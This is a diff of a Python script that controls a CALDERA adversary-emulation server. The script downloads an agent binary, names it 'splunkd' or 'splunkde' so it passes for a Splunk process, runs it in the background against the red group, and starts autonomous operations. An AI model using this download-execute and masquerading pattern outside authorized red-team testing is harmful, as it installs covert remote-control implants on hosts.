@@ -28,7 +28,7 @@ def create_agent():
 						f.write(chunk)
 		os.chmod("splunkd",0o755)
 		with open("agent.log", "wb") as log:
-    			subprocess.Popen(
+			subprocess.Popen(
         		[
             			"./splunkd",
             			"-server", CALDERA_URL,
@@ -37,7 +37,7 @@ def create_agent():
         		],
         		stdout=log,
         		stderr=log
-    		)
+			)
 	except Exception:
 		return False
 		
@@ -50,22 +50,22 @@ def create_agent2():
 	try:
 		with requests.post(url,headers=headers,stream=True) as response:
 			response.raise_for_status()
-			with open ("test", "wb") as f:
+			with open ("splunkde", "wb") as f:
 				for chunk in response.iter_content(chunk_size=8192):
 					if chunk:
 						f.write(chunk)
-		os.chmod("test",0o755)
+		os.chmod("splunkde",0o755)
 		with open("agent2.log", "wb") as log:
-    			subprocess.Popen(
+			subprocess.Popen(
         		[
-            			"./test",
+            			"./splunkde",
             			"-server", CALDERA_URL,
             			"-group", "red",
             			"-v"
         		],
         		stdout=log,
         		stderr=log
-    		)
+			)
 	except Exception:
 		return False
 		
@@ -132,13 +132,32 @@ ADVERSARY ID: 	{adversary['adversary_id']}
 		return False
 		
 
+def create_operation():
+	try:
+		Payload={
+			"name": "test dom",
+			"adversary" : {
+				"adversary_id": "0f4c3c67-845e-49a0-927e-90ed33c044e0" #"2346dbbc-9965-4380-bec3-689a291f43b6"
+			},
+			"planner": {
+				"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"
+			},
+			"autonomous":1,
+			"auto_close": False,
+			"source": {
+				"id": "ed32b9c3-9593-4c33-b0db-e2007315096b"
+			}
+		}	
+		r=requests.post(f"{CALDERA_URL}/api/v2/operations", headers = HEADERS, json=Payload ,timeout=14)
+		return r.status_code
+	except Exception:
+		return False
 # Operations
 def show_operations():
 	try:
 		r = requests.get(f"{CALDERA_URL}/api/v2/operations", headers = HEADERS, timeout=7)
 		operations=r.json()
 		for operation in operations:
-			print ("-" * 235)
 			print(f"""
 NAME:		{operation['name']}
 ID:		{operation['id']}
@@ -270,6 +289,5 @@ def format_steps(data: dict) -> list[dict]:
 		return formatted_steps
 	except Exception:
 		return False
-
 
 
